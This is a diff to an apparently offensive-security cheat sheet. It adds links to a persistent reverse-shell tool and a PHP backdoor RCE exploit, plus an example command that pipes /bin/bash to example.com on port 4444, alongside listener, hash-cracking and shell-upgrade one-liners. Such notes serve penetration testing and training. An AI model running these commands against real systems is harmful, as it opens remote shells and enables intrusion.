@@ -5,6 +5,8 @@
 ##### Nmap Automator. Save time on port/vuln scans:
 https://github.com/21y4d/nmapAutomator
 
+##### PWNCAT - Unbreakable Persistent Reverse Shell
+https://github.com/cytopia/pwncat
 
 
 
@@ -16,3 +18,8 @@ NETCAT | nc -nvlp 443   *(Creates a local listener)*
 CRACKING | hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst 
 SHELL | Resolve "TERM environment variable not set":  *$ *export TERM=xterm**
 SHELL | Fully interactive shell (Python): *$ python3 -c 'import pty; pty.spawn("/bin/bash")'*
+SHELL | PWNCAT Ex. *$ pwncat -e '/bin/bash' example.com 4444*
+
+## Exploits
+PHP 8.1.0-dev Backdoor RCE
+https://github.com/flast101/php-8.1.0-dev-backdoor-rce
